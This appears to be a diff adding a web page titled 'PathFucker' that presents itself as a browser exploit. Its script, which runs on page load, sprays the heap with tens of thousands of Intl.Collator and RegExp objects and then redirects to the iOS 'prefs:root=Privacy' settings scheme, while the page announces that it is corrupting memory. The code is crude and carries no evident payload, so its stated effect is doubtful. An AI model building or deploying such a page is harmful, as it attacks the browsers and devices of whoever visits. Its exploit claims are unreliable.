@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PathFucker</title>
+  <script>
+    // Heap spray using Intl & RegEx
+    let collators = [];
+    for (let i = 0; i < 40000; i++) {
+      collators.push(new Intl.Collator("en", { usage: "search" }));
+    }
+
+    // Memory abuse loop
+    function fuckMemory() {
+      let victim = [];
+      for (let i = 0; i < 65000; i++) {
+        victim.push(RegExp("A", "g"));
+      }
+      setTimeout(() => {
+        // Attempt redirect via Setup scheme
+        window.location = "prefs:root=Privacy";
+      }, 2000);
+    }
+  </script>
+</head>
+<body onload="fuckMemory()">
+  <h1>Setup Exploit Triggered</h1>
+  <p>This page is corrupting memory. Hold tight.</p>
+</body>
+</html>
